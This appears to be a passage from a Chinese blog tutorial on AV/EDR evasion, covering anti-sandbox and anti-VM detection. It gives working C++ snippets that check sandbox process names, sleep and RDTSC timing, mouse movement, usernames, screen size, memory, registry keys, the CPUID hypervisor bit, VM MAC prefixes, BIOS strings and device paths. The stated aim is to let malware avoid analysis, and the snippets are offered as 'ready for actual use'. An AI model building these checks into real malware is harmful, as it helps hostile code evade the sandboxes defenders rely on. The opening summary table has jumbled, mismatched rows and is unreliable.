<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">al-khaser<span class="hljs-regexp">/AntiDebug/</span><br>al-khaser<span class="hljs-regexp">/EDR Evasion/</span><br></code></pre></td></tr></table></figure>

<p>每个都有标签、文档，并准备好用于实际使用或仿真。</p>
<hr>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><table>
<thead>
<tr>
<th>技巧</th>
<th>被绕过</th>
<th>仍然有效？</th>
</tr>
</thead>
<tbody><tr>
<td>IsDebuggerPresent</td>
<td>ScyllaHide, TitanHide</td>
<td>是的，作为一层防御</td>
</tr>
<tr>
<td>陷阱标志 &#x2F; INT 2D</td>
<td>低端沙箱</td>
<td>是的</td>
</tr>
<tr>
<td>TLS回调</td>
<td>静态扫描器</td>
<td>是的</td>
</tr>
<tr>
<td>VEH &#x2F; SEH陷阱</td>
<td>高级调试</td>
<td>非常有效</td>
</tr>
<tr>
<td>DRx寄存器</td>
<td>手动RE工具</td>
<td>关键</td>
</tr>
<tr>
<td>自我调试</td>
<td>进程注入检查</td>
<td>WinDbg, x64dbg</td>
</tr>
<tr>
<td>TLS回调</td>
<td>早期执行</td>
<td>OllyDbg, 静态AV</td>
</tr>
<tr>
<td>堆标志</td>
<td>运行时完整性</td>
<td>软件断点</td>
</tr>
<tr>
<td>NtQuery DebugPort</td>
<td>内核级调试器检查</td>
<td>TitanHide</td>
</tr>
<tr>
<td>VEH内存扫描</td>
<td>钩子检测</td>
<td>ScyllaHide, AV EDR</td>
</tr>
<tr>
<td>OutputDebugString</td>
<td>基于SEH的触发器</td>
<td>管理型调试器</td>
</tr>
<tr>
<td>Ntdll内联钩子</td>
<td>内存完整性</td>
<td>用户模式rootkit</td>
</tr>
</tbody></table>
<h2 id="AV-EDR规避技术-7-2-反沙箱技术"><a href="#AV-EDR规避技术-7-2-反沙箱技术" class="headerlink" title="AV&#x2F;EDR规避技术 - 7.2 - 反沙箱技术"></a>AV&#x2F;EDR规避技术 - 7.2 - 反沙箱技术</h2><p><strong>目标：</strong> 检测并规避沙箱环境，如 Cuckoo、Any.Run、Joe Sandbox、Hybrid Analysis 或内部 AV 沙箱。</p>
<hr>
<h3 id="1-检查已知沙箱遗留物（文件、进程、服务、窗口标题）"><a href="#1-检查已知沙箱遗留物（文件、进程、服务、窗口标题）" class="headerlink" title="1. 检查已知沙箱遗留物（文件、进程、服务、窗口标题）"></a>1. 检查已知沙箱遗留物（文件、进程、服务、窗口标题）</h3><p>许多沙箱环境会留下痕迹或运行已知的进程，这些可以被检测到。包括默认的进程名、已安装的服务、特定的文件或窗口名。</p>
<h4 id="示例：检测已知的可疑进程"><a href="#示例：检测已知的可疑进程" class="headerlink" title="示例：检测已知的可疑进程"></a>示例：检测已知的可疑进程</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsSandboxProcessPresent</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* suspicious[] = &#123;<br>        <span class="hljs-string">&quot;vmsrvc.exe&quot;</span>, <span class="hljs-string">&quot;vmwaretray.exe&quot;</span>, <span class="hljs-string">&quot;vmtoolsd.exe&quot;</span>, <span class="hljs-string">&quot;df5serv.exe&quot;</span>,<br>        <span class="hljs-string">&quot;vboxservice.exe&quot;</span>, <span class="hljs-string">&quot;vboxtray.exe&quot;</span>, <span class="hljs-string">&quot;xenservice.exe&quot;</span>, <span class="hljs-string">&quot;joeboxcontrol.exe&quot;</span><br>    &#125;;<br><br>    PROCESSENTRY32 pe32;<br>    pe32.dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br>    HANDLE snapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Process32First</span>(snapshot, &amp;pe32)) &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; name : suspicious) &#123;<br>                <span class="hljs-keyword">if</span> (_stricmp(pe32.szExeFile, name) == <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-built_in">CloseHandle</span>(snapshot);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(snapshot, &amp;pe32));<br>    &#125;<br><br>    <span class="hljs-built_in">CloseHandle</span>(snapshot);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="2-时间检查（跳过休眠、RDTSC-时间）"><a href="#2-时间检查（跳过休眠、RDTSC-时间）" class="headerlink" title="2. 时间检查（跳过休眠、RDTSC 时间）"></a>2. 时间检查（跳过休眠、RDTSC 时间）</h3><p>沙箱可能会操控或加速系统时间，以绕过恶意软件执行中的延迟。这些异常可以通过时间 API 或 CPU 指令检测到。</p>
<h4 id="示例：检测跳过休眠"><a href="#示例：检测跳过休眠" class="headerlink" title="示例：检测跳过休眠"></a>示例：检测跳过休眠</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SleepTimingCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    DWORD start = <span class="hljs-built_in">GetTickCount</span>();<br>    <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">5000</span>);<br>    DWORD end = <span class="hljs-built_in">GetTickCount</span>();<br>    <span class="hljs-keyword">return</span> (end - start &lt; <span class="hljs-number">4900</span>); <span class="hljs-comment">// 沙箱可能跳过了休眠</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="示例：使用-RDTSC-检测-CPU-周期差异"><a href="#示例：使用-RDTSC-检测-CPU-周期差异" class="headerlink" title="示例：使用 RDTSC 检测 CPU 周期差异"></a>示例：使用 RDTSC 检测 CPU 周期差异</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">RdtscTimingCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> t1, t2;<br>    __asm &#123;<br>        rdtsc<br>        mov t1, eax<br>        rdtsc<br>        mov t2, eax<br>    &#125;<br>    <span class="hljs-keyword">return</span> (t2 - t1 &lt; <span class="hljs-number">100</span>); <span class="hljs-comment">// 差距非常小 = 仿真或沙箱</span><br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="3-鼠标移动或用户交互检测"><a href="#3-鼠标移动或用户交互检测" class="headerlink" title="3. 鼠标移动或用户交互检测"></a>3. 鼠标移动或用户交互检测</h3><p>大多数自动化沙箱不会模拟人工输入。恶意软件可以延迟执行，直到检测到鼠标移动。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">MouseMovedRecently</span><span class="hljs-params">()</span> </span>&#123;<br>    POINT pt1, pt2;<br>    <span class="hljs-built_in">GetCursorPos</span>(&amp;pt1);<br>    <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">3000</span>); <span class="hljs-comment">// 给用户移动的时间</span><br>    <span class="hljs-built_in">GetCursorPos</span>(&amp;pt2);<br>    <span class="hljs-keyword">return</span> (pt1.x != pt2.x || pt1.y != pt2.y);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="4-检查可疑的用户名或计算机名"><a href="#4-检查可疑的用户名或计算机名" class="headerlink" title="4. 检查可疑的用户名或计算机名"></a>4. 检查可疑的用户名或计算机名</h3><p>沙箱环境通常使用像“sandbox”、“malware”、“analyst”这样的通用名称。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">CheckUserComputerName</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">char</span> user[<span class="hljs-number">256</span>], comp[<span class="hljs-number">256</span>];<br>    DWORD size = <span class="hljs-number">256</span>;<br><br>    <span class="hljs-built_in">GetUserNameA</span>(user, &amp;size);<br>    size = <span class="hljs-number">256</span>;<br>    <span class="hljs-built_in">GetComputerNameA</span>(comp, &amp;size);<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* bad[] = &#123; <span class="hljs-string">&quot;sandbox&quot;</span>, <span class="hljs-string">&quot;malware&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;lab&quot;</span>, <span class="hljs-string">&quot;analyst&quot;</span> &#125;;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; keyword : bad) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(user, keyword) || <span class="hljs-built_in">strstr</span>(comp, keyword)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="5-屏幕分辨率或色深检查"><a href="#5-屏幕分辨率或色深检查" class="headerlink" title="5. 屏幕分辨率或色深检查"></a>5. 屏幕分辨率或色深检查</h3><p>虚拟机和沙箱通常使用非标准的分辨率或减少色深来节省资源。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">LowResCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> width = <span class="hljs-built_in">GetSystemMetrics</span>(SM_CXSCREEN);<br>    <span class="hljs-type">int</span> height = <span class="hljs-built_in">GetSystemMetrics</span>(SM_CYSCREEN);<br>    <span class="hljs-keyword">return</span> (width &lt; <span class="hljs-number">1024</span> || height &lt; <span class="hljs-number">768</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="6-内存或-CPU-检查"><a href="#6-内存或-CPU-检查" class="headerlink" title="6. 内存或 CPU 检查"></a>6. 内存或 CPU 检查</h3><p>低资源（例如：&lt;2GB RAM）可能表示受控环境。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">LowMemoryCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    MEMORYSTATUSEX statex;<br>    statex.dwLength = <span class="hljs-built_in">sizeof</span>(statex);<br>    <span class="hljs-built_in">GlobalMemoryStatusEx</span>(&amp;statex);<br>    <span class="hljs-keyword">return</span> (statex.ullTotalPhys &lt; (<span class="hljs-number">2LL</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>)); <span class="hljs-comment">// 2 GB</span><br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="7-注册表遗留物（Sandboxie、JoeBox-等）"><a href="#7-注册表遗留物（Sandboxie、JoeBox-等）" class="headerlink" title="7. 注册表遗留物（Sandboxie、JoeBox 等）"></a>7. 注册表遗留物（Sandboxie、JoeBox 等）</h3><p>某些工具会创建独特的注册表键或值。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SandboxieRegistryCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    HKEY hKey;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegOpenKeyExA</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">&quot;Software\\Sandboxie&quot;</span>, <span class="hljs-number">0</span>, KEY_READ, &amp;hKey) == ERROR_SUCCESS) &#123;<br>        <span class="hljs-built_in">RegCloseKey</span>(hKey);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="实际应用-2"><a href="#实际应用-2" class="headerlink" title="实际应用"></a>实际应用</h3><p>这些技术被像 TrickBot、GuLoader 和 Remcos 这样的恶意软件家族使用。它们结合多种检查，以确保在执行恶意载荷之前不会被分析。</p>
<hr>
<h3 id="测试和分析工具"><a href="#测试和分析工具" class="headerlink" title="测试和分析工具"></a>测试和分析工具</h3><ul>
<li><p><strong>Cuckoo Sandbox:</strong> <a target="_blank" rel="noopener" href="https://github.com/cuckoosandbox">https://github.com/cuckoosandbox</a></p>
</li>
<li><p><strong>Any.Run:</strong> <a target="_blank" rel="noopener" href="https://any.run/">https://any.run/</a></p>
</li>
<li><p><strong>Joe Sandbox:</strong> <a target="_blank" rel="noopener" href="https://www.joesecurity.org/">https://www.joesecurity.org/</a></p>
</li>
<li><p><strong>ProcMon:</strong> 用于运行时监控。</p>
</li>
<li><p><strong>x64dbg:</strong> 用于交互式调试。</p>
</li>
<li><p><strong>Al-Khaser 项目（许多反沙箱测试）：</strong> <a target="_blank" rel="noopener" href="https://github.com/LordNoteworthy/al-khaser">https://github.com/LordNoteworthy/al-khaser</a></p>
</li>
</ul>
<h2 id="AV-EDR规避技术-7-3-反虚拟机检测技术"><a href="#AV-EDR规避技术-7-3-反虚拟机检测技术" class="headerlink" title="AV&#x2F;EDR规避技术 - 7.3 - 反虚拟机检测技术"></a>AV&#x2F;EDR规避技术 - 7.3 - 反虚拟机检测技术</h2><p><strong>目标：</strong> 识别恶意软件是否在虚拟机（VM）中运行，例如 VirtualBox、VMware、Hyper-V、QEMU 或 Parallels，并改变行为或中止执行以避免分析。</p>
<hr>
<h3 id="1-使用-CPUID-指令检测虚拟化管理程序"><a href="#1-使用-CPUID-指令检测虚拟化管理程序" class="headerlink" title="1. 使用 CPUID 指令检测虚拟化管理程序"></a>1. <strong>使用 CPUID 指令检测虚拟化管理程序</strong></h3><p><code>CPUID</code> 指令可用于检测处理器是否在虚拟化管理程序下运行。</p>
<h4 id="示例：检查虚拟化管理程序位"><a href="#示例：检查虚拟化管理程序位" class="headerlink" title="示例：检查虚拟化管理程序位"></a>示例：检查虚拟化管理程序位</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrin.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsRunningInVM_CPUID</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> cpuInfo[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    __cpuid(cpuInfo, <span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-comment">// ECX 的第31位是虚拟化管理程序存在位</span><br>    <span class="hljs-keyword">return</span> (cpuInfo[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>如果返回 <code>true</code>，则表示存在虚拟化管理程序，可能是在虚拟机内执行。</p>
<hr>
<h3 id="2-检查已知的-MAC-地址"><a href="#2-检查已知的-MAC-地址" class="headerlink" title="2. 检查已知的 MAC 地址"></a>2. <strong>检查已知的 MAC 地址</strong></h3><p>虚拟机通常使用默认的 MAC 地址前缀。例如：</p>
<ul>
<li><p>VMware: 00:05:69, 00:0C:29, 00:50:56</p>
</li>
<li><p>VirtualBox: 08:00:27</p>
</li>
</ul>
<h4 id="示例：枚举网络适配器以检查虚拟机-MAC-地址"><a href="#示例：枚举网络适配器以检查虚拟机-MAC-地址" class="headerlink" title="示例：枚举网络适配器以检查虚拟机 MAC 地址"></a>示例：枚举网络适配器以检查虚拟机 MAC 地址</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iphlpapi.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;iphlpapi.lib&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">HasVMMacAddress</span><span class="hljs-params">()</span> </span>&#123;<br>    PIP_ADAPTER_INFO adapterInfo;<br>    DWORD bufLen = <span class="hljs-built_in">sizeof</span>(IP_ADAPTER_INFO);<br>    adapterInfo = (IP_ADAPTER_INFO*)<span class="hljs-built_in">malloc</span>(bufLen);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetAdaptersInfo</span>(adapterInfo, &amp;bufLen) == ERROR_BUFFER_OVERFLOW) &#123;<br>        <span class="hljs-built_in">free</span>(adapterInfo);<br>        adapterInfo = (IP_ADAPTER_INFO*)<span class="hljs-built_in">malloc</span>(bufLen);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetAdaptersInfo</span>(adapterInfo, &amp;bufLen) == NO_ERROR) &#123;<br>        PIP_ADAPTER_INFO adapter = adapterInfo;<br>        <span class="hljs-keyword">while</span> (adapter) &#123;<br>            <span class="hljs-type">char</span> macStr[<span class="hljs-number">18</span>];<br>            <span class="hljs-built_in">sprintf_s</span>(macStr, <span class="hljs-string">&quot;%02X:%02X:%02X:%02X:%02X:%02X&quot;</span>,<br>                      adapter-&gt;Address[<span class="hljs-number">0</span>], adapter-&gt;Address[<span class="hljs-number">1</span>], adapter-&gt;Address[<span class="hljs-number">2</span>],<br>                      adapter-&gt;Address[<span class="hljs-number">3</span>], adapter-&gt;Address[<span class="hljs-number">4</span>], adapter-&gt;Address[<span class="hljs-number">5</span>]);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(macStr, <span class="hljs-string">&quot;00:05:69&quot;</span>, <span class="hljs-number">8</span>) == <span class="hljs-number">0</span> || <br>                <span class="hljs-built_in">strncmp</span>(macStr, <span class="hljs-string">&quot;00:0C:29&quot;</span>, <span class="hljs-number">8</span>) == <span class="hljs-number">0</span> ||<br>                <span class="hljs-built_in">strncmp</span>(macStr, <span class="hljs-string">&quot;08:00:27&quot;</span>, <span class="hljs-number">8</span>) == <span class="hljs-number">0</span> ||<br>                <span class="hljs-built_in">strncmp</span>(macStr, <span class="hljs-string">&quot;00:50:56&quot;</span>, <span class="hljs-number">8</span>) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">free</span>(adapterInfo);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            adapter = adapter-&gt;Next;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">free</span>(adapterInfo);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="3-检查虚拟机特定设备（驱动程序）"><a href="#3-检查虚拟机特定设备（驱动程序）" class="headerlink" title="3. 检查虚拟机特定设备（驱动程序）"></a>3. <strong>检查虚拟机特定设备（驱动程序）</strong></h3><p>通过使用 Windows API 或注册表访问，可以查找与虚拟机平台相关的设备驱动程序。</p>
<h4 id="示例：检查注册表中是否有虚拟机工具"><a href="#示例：检查注册表中是否有虚拟机工具" class="headerlink" title="示例：检查注册表中是否有虚拟机工具"></a>示例：检查注册表中是否有虚拟机工具</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">CheckVMwareTools</span><span class="hljs-params">()</span> </span>&#123;<br>    HKEY hKey;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegOpenKeyExA</span>(HKEY_LOCAL_MACHINE,<br>        <span class="hljs-string">&quot;SYSTEM\\CurrentControlSet\\Services\\vmtools&quot;</span>,<br>        <span class="hljs-number">0</span>, KEY_READ, &amp;hKey) == ERROR_SUCCESS) &#123;<br>        <span class="hljs-built_in">RegCloseKey</span>(hKey);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以扩展这个检查，查找以下驱动程序：</p>
<ul>
<li><code>vmmouse</code>、<code>vmhgfs</code>、<code>VBoxService</code>、<code>VBoxGuest</code>、<code>qemu-ga</code></li>
</ul>
<hr>
<h3 id="4-枚举-BIOS-或系统字符串"><a href="#4-枚举-BIOS-或系统字符串" class="headerlink" title="4. 枚举 BIOS 或系统字符串"></a>4. <strong>枚举 BIOS 或系统字符串</strong></h3><p>虚拟机平台通常在 BIOS 或 SMBIOS 数据中留下可识别的痕迹。</p>
<h4 id="示例：使用-GetSystemFirmwareTable-或-WMI"><a href="#示例：使用-GetSystemFirmwareTable-或-WMI" class="headerlink" title="示例：使用 GetSystemFirmwareTable 或 WMI"></a>示例：使用 <code>GetSystemFirmwareTable</code> 或 WMI</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">CheckBIOSforVM</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">char</span> manufacturer[<span class="hljs-number">128</span>];<br>    DWORD size = <span class="hljs-number">128</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetSystemFirmwareTable</span>(<span class="hljs-string">&#x27;RSMB&#x27;</span>, <span class="hljs-number">0</span>, manufacturer, size)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(manufacturer, <span class="hljs-string">&quot;VMware&quot;</span>) || <span class="hljs-built_in">strstr</span>(manufacturer, <span class="hljs-string">&quot;VirtualBox&quot;</span>) ||<br>            <span class="hljs-built_in">strstr</span>(manufacturer, <span class="hljs-string">&quot;QEMU&quot;</span>) || <span class="hljs-built_in">strstr</span>(manufacturer, <span class="hljs-string">&quot;Xen&quot;</span>) || <span class="hljs-built_in">strstr</span>(manufacturer, <span class="hljs-string">&quot;Hyper-V&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>替代方法：使用 WMI 查询（需要链接 <code>wbemuuid.lib</code>）</p>
<hr>
<h3 id="5-时间和性能异常"><a href="#5-时间和性能异常" class="headerlink" title="5. 时间和性能异常"></a>5. <strong>时间和性能异常</strong></h3><p>虚拟机可能会表现出不寻常的时间特征（例如，较慢的 TSC，I&#x2F;O 性能不一致）。可以将这些数据与物理机基准进行对比。</p>
<hr>
<h3 id="6-检查文件系统和设备路径"><a href="#6-检查文件系统和设备路径" class="headerlink" title="6. 检查文件系统和设备路径"></a>6. <strong>检查文件系统和设备路径</strong></h3><p>路径如 <code>\\.\VBoxMiniRdrDN</code> 或文件如 <code>C:\windows\system32\drivers\vmmouse.sys</code> 是很好的指示符。</p>
<h4 id="示例：检查设备是否存在"><a href="#示例：检查设备是否存在" class="headerlink" title="示例：检查设备是否存在"></a>示例：检查设备是否存在</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">CheckVBoxDevice</span><span class="hljs-params">()</span> </span>&#123;<br>    HANDLE hDevice = <span class="hljs-built_in">CreateFileA</span>(<span class="hljs-string">&quot;\\\\.\\VBoxMiniRdrDN&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hDevice != INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hDevice);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="实际恶意软件中的检测"><a href="#实际恶意软件中的检测" class="headerlink" title="实际恶意软件中的检测"></a>实际恶意软件中的检测</h3><p>像 Lokibot、Agent Tesla、Redline Stealer 和 Qbot 这样的恶意软件家族常常执行多向反虚拟机检测，以避免动态分析。</p>
<hr>
<h3 id="进一步阅读和工具"><a href="#进一步阅读和工具" class="headerlink" title="进一步阅读和工具"></a>进一步阅读和工具</h3><ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/LordNoteworthy/al-khaser">al-khaser VM 测试</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/mandiant/flare-vm">Flare VM</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://malgamy.github.io/revese%20enginnering/">Malgamy 反逆向系列</a></p>
</li>
</ul>
